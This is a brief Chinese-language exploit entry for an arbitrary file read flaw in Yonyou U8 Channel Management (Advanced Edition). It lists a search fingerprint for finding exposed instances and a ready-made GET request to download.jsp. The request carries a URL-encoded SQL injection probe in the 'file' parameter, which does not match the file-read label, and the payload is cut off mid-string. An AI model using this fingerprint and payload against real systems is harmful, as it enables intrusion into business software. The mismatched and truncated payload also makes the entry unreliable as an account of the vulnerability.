# 用友U8渠道管理(高级版)downloadnew存在任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="渠道管理（高级版）"`
- **请求**：`GET /business/common/download.jsp?filename=&foldertype=&file=%27+AND+9228+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289228%3D9228%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898`
- **预期**：200　|　—